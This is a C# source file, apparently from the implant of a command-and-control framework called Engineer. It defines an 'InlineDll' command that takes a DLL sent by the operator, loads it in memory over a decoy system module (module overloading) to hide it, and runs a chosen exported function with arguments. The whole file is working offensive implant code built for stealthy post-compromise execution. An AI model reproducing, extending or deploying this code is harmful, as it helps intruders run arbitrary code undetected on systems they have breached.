using Engineer.Commands;
using Engineer.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Policy;
using System.Text;
using System.Threading.Tasks;
using Engineer.Extra;

namespace Engineer.Commands
{
    internal class InlineDll : EngineerCommand
    {
        public override string Name => "InlineDll";

        public override string Execute(EngineerTask task)
        {
            try
            {
                if (task.File.Length < 1)
                {
                    return "Error: /dll argument not found, please include the path to the dll to load, it should be present on the ts";
                }
                if (!task.Arguments.TryGetValue("/function", out string export))
                {
                    return "Error: /function argument not found, this is the exported function of the dll to call";
                }
                task.Arguments.TryGetValue("/args", out string args);
                args = args.TrimStart(' ');
                export = export.TrimStart(' ');

                byte[] dllBytes = task.File;
                Console.WriteLine($"got {dllBytes.Length} bytes");

                //uses dinvoke to map and load any dll, and execute desired functions.
                // find a decoy
                var decoy = reprobate.FindDecoyModule(dllBytes.Length);

                if (string.IsNullOrWhiteSpace(decoy))
                {
                    return "Error: No suitable decoy found";
                }
                Console.WriteLine("found decoy trying to overload module");
                // map the module
                var map = reprobate.OverloadModule(dllBytes, decoy);
                Console.WriteLine("module overloaded");
                object[] parameters = new object[] { args };

                // run
                Console.WriteLine("executing dll");
                var result = (string)reprobate.CallMappedDLLModuleExport(map.PEINFO, map.ModuleBase, export, typeof(WinApiDynamicDelegate.GenericDelegate), parameters);

                // return output
                return result;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.WriteLine(ex.StackTrace);
                return ex.Message;
            }
        }
    }
}
